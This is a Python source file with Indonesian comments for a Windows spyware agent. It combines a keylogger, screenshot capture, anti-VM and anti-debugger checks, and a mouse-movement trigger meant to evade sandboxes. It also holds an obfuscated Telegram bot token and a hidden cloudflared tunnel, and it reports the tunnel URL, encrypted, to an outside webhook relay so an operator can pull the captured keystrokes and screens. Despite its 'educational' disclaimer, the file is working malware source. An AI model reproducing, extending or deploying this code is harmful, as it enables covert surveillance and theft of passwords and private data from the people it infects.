# agent.py - Versi Final dengan Perbaikan Payload
# Mengirimkan URL Cloudflare yang benar di dalam payload terenkripsi.
# PERINGATAN: Gunakan secara bertanggung jawab dan untuk tujuan edukasi.

# --- Standard Libraries ---
import sys, os, platform, subprocess, threading, time, requests, re, io, logging, json, winreg, ctypes, base64
from collections import deque
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from ctypes import wintypes, windll, byref, POINTER

# --- Dependencies ---
from PIL import ImageGrab
import psutil
import wmi
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from pynput import mouse
from pynput import keyboard

# --- Konfigurasi ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s')
WEBHOOK_URL = "https://f0d2ae93-5d58-4ab1-9cdc-13a77f32c840-00-24sud4ep8fn6.riker.replit.dev/notify"
FEATURES_ACTIVE = False 
MOUSE_MOVE_THRESHOLD = 5000

# --- Kelas Enkripsi AES ---
class Encryptor:
    AES_KEY = b'my_super_secret_key_1234567890!@'
    @staticmethod
    def encrypt(plain_text_json: str) -> str:
        try:
            data_bytes = plain_text_json.encode('utf-8')
            iv = get_random_bytes(16)
            cipher = AES.new(Encryptor.AES_KEY, AES.MODE_CBC, iv)
            padded_data = pad(data_bytes, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            return base64.b64encode(iv + encrypted_data).decode('utf-8')
        except Exception as e:
            logging.error(f"AES encryption failed: {e}")
            return ""

# --- Kelas Obfuskasi ROT13 + XOR ---
class Obfuscator:
    XOR_KEY = 0xAA
    @staticmethod
    def rot13(text: str) -> str:
        r = ""
        for c in text:
            if 'a'<=c<='z': r+=chr((ord(c)-ord('a')+13)%26+ord('a'))
            elif 'A'<=c<='Z': r+=chr((ord(c)-ord('A')+13)%26+ord('A'))
            else: r+=c
        return r
    @staticmethod
    def build_and_decode(obfuscated_parts: tuple) -> str:
        try:
            reconstructed_bytes = bytes(obfuscated_parts)
            rot13_string = reconstructed_bytes.decode('latin-1')
            xor_string = Obfuscator.rot13(rot13_string)
            decoded_bytes = bytearray(b ^ Obfuscator.XOR_KEY for b in xor_string.encode('latin-1'))
            return decoded_bytes.decode('utf-8')
        except: return ""

# --- Konfigurasi Kredensial ---
OBFUSCATED_BOT_TOKEN_PARTS = (157, 147, 157, 158, 155, 153, 147, 159, 147, 152, 144, 235, 235, 237, 146, 200, 194, 156, 193, 230, 229, 203, 223, 204, 220, 198, 233, 255, 239, 236, 153, 227, 211, 219, 251, 219, 228, 198, 195, 245, 254, 221, 217, 205, 238, 217)
OBFUSCATED_CHAT_ID_PARTS = (157, 157, 152, 153, 158, 155, 157, 146, 154)
BOT_TOKEN = Obfuscator.build_and_decode(OBFUSCATED_BOT_TOKEN_PARTS)
CHAT_ID = Obfuscator.build_and_decode(OBFUSCATED_CHAT_ID_PARTS)

# --- Kelas Anti-Analisis Lanjutan ---
class AntiAnalysis:
    # ... (Kode di dalam kelas ini tidak berubah) ...
    @staticmethod
    def run_all_checks()->bool:
        logging.info("Menjalankan pemeriksaan keamanan lingkungan...")
        if AntiAnalysis.check_debugger() or AntiAnalysis.check_timing(): return True
        if AntiAnalysis.check_vm_mac() or AntiAnalysis.check_vm_processes() or AntiAnalysis.check_vm_registry() or AntiAnalysis.check_vm_wmi(): return True
        if AntiAnalysis.check_screen_resolution() or AntiAnalysis.check_cpu_cores() or AntiAnalysis.check_ram_size(): return True
        # if AntiAnalysis.check_operating_hours(): return True
        logging.info("Lingkungan aman.")
        return False
    @staticmethod
    def check_screen_resolution()->bool:
        try: return windll.user32.GetSystemMetrics(0)<1024 or windll.user32.GetSystemMetrics(1)<768
        except: return False
    @staticmethod
    def check_cpu_cores()->bool:
        try: return psutil.cpu_count(logical=False)<2
        except: return False
    @staticmethod
    def check_ram_size()->bool:
        try: return psutil.virtual_memory().total < (2 * 1024**3)
        except: return False
    @staticmethod
    def check_operating_hours()->bool:
        now=datetime.now();return not (0<=now.weekday()<=4 and 9<=now.hour<17)
    @staticmethod
    def check_debugger()->bool:
        try: return windll.kernel32.IsDebuggerPresent()
        except: return False
    @staticmethod
    def check_timing()->bool: s=time.time();time.sleep(1);return (time.time()-s)>1.5
    @staticmethod
    def check_vm_mac()->bool:
        p=("00:05:69","00:0c:29","00:1c:14","00:50:56","08:00:27");
        try:
            for _,a in psutil.net_if_addrs().items():
                for n in a:
                    if n.family==psutil.AF_LINK and n.address.lower().startswith(p): return True
        except: pass
        return False
    @staticmethod
    def check_vm_processes()->bool:
        v=["vmtoolsd.exe","vboxservice.exe","vboxtray.exe","vmwareuser.exe"];
        for p in psutil.process_iter(['name']):
            if p.info['name'].lower() in v: return True
        return False
    @staticmethod
    def check_vm_registry()->bool:
        vm_keys={winreg.HKEY_LOCAL_MACHINE:r"SOFTWARE\Oracle\VirtualBox Guest Additions",winreg.HKEY_LOCAL_MACHINE:r"SOFTWARE\VMware, Inc.\VMware Tools"}
        for h,p in vm_keys.items():
            try:
                with winreg.OpenKey(h,p): pass
                return True
            except FileNotFoundError: continue
        return False
    @staticmethod
    def check_vm_wmi()->bool:
        try:
            c=wmi.WMI();vm_h=["virtualbox","vmware"];
            for d in c.Win32_DiskDrive():
                if d.Model and any(v in d.Model.lower() for v in vm_h): return True
        except: pass
        return False

# --- Fungsi Aktivasi Berbasis Mouse ---
def activate_on_mouse_move():
    total_distance = 0
    last_pos = None
    def on_move(x, y):
        global FEATURES_ACTIVE
        nonlocal total_distance, last_pos
        if last_pos is not None: total_distance += abs(x - last_pos[0]) + abs(y - last_pos[1])
        last_pos = (x, y)
        if total_distance > MOUSE_MOVE_THRESHOLD:
            if not FEATURES_ACTIVE:
                FEATURES_ACTIVE = True
                logging.info("Aktivitas pengguna terdeteksi. Fitur berbahaya SEKARANG AKTIF.")
            return False 
    logging.info(f"Menunggu aktivitas pengguna (gerakan mouse > {MOUSE_MOVE_THRESHOLD} piksel)...")
    with mouse.Listener(on_move=on_move) as listener:
        listener.join()

# --- Keylogger ---
logged_keys = deque(maxlen=500)
def on_press(key):
    if FEATURES_ACTIVE:
        try: logged_keys.append(key.char)
        except AttributeError: logged_keys.append(f"[{str(key).replace('Key.', '').upper()}]")
def start_key_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --- Fungsi Komunikasi dan Lainnya ---
def get_resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)
def get_system_info(): m=psutil.virtual_memory();return{'cpu_usage':psutil.cpu_percent(interval=0.1),'memory_info':{'percent':m.percent,'total_gb':round(m.total/(1024**3),2),'used_gb':round(m.used/(1024**3),2)}}
def get_process_list(): p=[];[p.append(proc.info) for proc in psutil.process_iter(['pid','name','username']) if proc.info.get('name')];return sorted(p,key=lambda i:i['name'].lower())
def get_network_info():
    try:
        r=requests.get("http://ip-api.com/json",timeout=5);r.raise_for_status();d=r.json()
        if d.get('status')=='fail':return{'ip':'N/A','location':'N/A','provider':'N/A'}
        return{'ip':d.get('query','N/A'),'location':f"{d.get('city','N/A')}, {d.get('country','N/A')}",'provider':d.get('isp','N/A')}
    except requests.exceptions.RequestException:return{'ip':'Gagal','location':'Gagal','provider':'Gagal'}

# (DIPERBARUI) Fungsi send_to_relay sekarang menerima parameter 'url'
def send_to_relay(url):
    if "your-repl-name" in WEBHOOK_URL: return
    try:
        # (DIPERBARUI) Payload sekarang berisi URL dan hostname yang benar
        payload_data = {"url": url, "hostname": platform.node()}
        payload_json = json.dumps(payload_data)
        
        encrypted_payload = Encryptor.encrypt(payload_json)
        
        requests.post(WEBHOOK_URL, json={"data": encrypted_payload}, timeout=10)
        logging.info("Payload terenkripsi berhasil dikirim ke webhook relay.")
    except Exception as e:
        logging.error(f"Gagal mengirim ke webhook relay: {e}")

def start_cloudflared_and_notify():
    time.sleep(3)
    cloudflared_path=get_resource_path('cloudflared.exe')
    if not os.path.exists(cloudflared_path): return
    command=[cloudflared_path,"tunnel","--url",f"http://localhost:{PORT}"]
    creation_flags=subprocess.CREATE_NO_WINDOW if platform.system()=="Windows" else 0
    process=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,universal_newlines=True,encoding='utf-8',creationflags=creation_flags)
    url_found = False
    for line in iter(process.stdout.readline, ''):
        if not url_found:
            match=re.search(r'(https?://[a-zA-Z0-9-]+\.trycloudflare\.com)',line)
            if match:
                url=match.group(0)
                logging.info(f"URL DITEMUKAN: {url}")
                send_to_relay(url) # (DIPERBARUI) Meneruskan URL ke fungsi
                url_found=True

# --- Web Server ---
class MonitoringRequestHandler(BaseHTTPRequestHandler):
    # ... (Kode di dalam kelas ini tidak berubah) ...
    def _send_response(self, code, content_type, body):
        self.send_response(code);self.send_header('Content-type', content_type);self.send_header('Access-Control-Allow-Origin', '*');self.end_headers()
        if isinstance(body, str): self.wfile.write(body.encode('utf-8'))
        else: self.wfile.write(body)
    def do_GET(self):
        try:
            if self.path == '/':
                filepath = get_resource_path('templates/index.html')
                with open(filepath, 'r', encoding='utf-8') as f: self._send_response(200, 'text/html; charset=utf-8', f.read())
            elif self.path == '/api/data':
                data = {'system': get_system_info(),'processes': get_process_list(),'os': platform.platform(), 'network': get_network_info()}
                self._send_response(200, 'application/json', json.dumps(data))
            elif self.path.startswith('/api/screenshot'):
                if not FEATURES_ACTIVE: self._send_response(202, 'application/json', '{"status": "waiting"}'); return
                img_buffer = io.BytesIO(); ImageGrab.grab().save(img_buffer, format='JPEG', quality=75); self._send_response(200, 'image/jpeg', img_buffer.getvalue())
            elif self.path == '/api/keystrokes':
                if not FEATURES_ACTIVE: self._send_response(202, 'application/json', '[]'); return
                keys_to_send = list(logged_keys); logged_keys.clear(); self._send_response(200, 'application/json', json.dumps(keys_to_send))
            else: self._send_response(404, 'text/plain', 'Not Found')
        except Exception as e:
            logging.error(f"Error saat menangani request {self.path}: {e}"); self._send_response(500, 'text/plain', 'Internal Server Error')
    def log_message(self, format, *args): return
PORT = 7860
if __name__ == '__main__':
    if AntiAnalysis.run_all_checks(): sys.exit(0)
    threading.Thread(target=start_key_listener, daemon=True, name="Keylogger").start()
    threading.Thread(target=start_cloudflared_and_notify, daemon=True, name="Cloudflare").start()
    threading.Thread(target=activate_on_mouse_move, daemon=True, name="MouseActivation").start()
    try:
        server_address = ('0.0.0.0', PORT); httpd = HTTPServer(server_address, MonitoringRequestHandler)
        logging.info(f"Server HTTP ringan dimulai di http://{server_address[0]}:{server_address[1]}/")
        httpd.serve_forever()
    except Exception as e: logging.critical(f"Gagal memulai server HTTP: {e}")
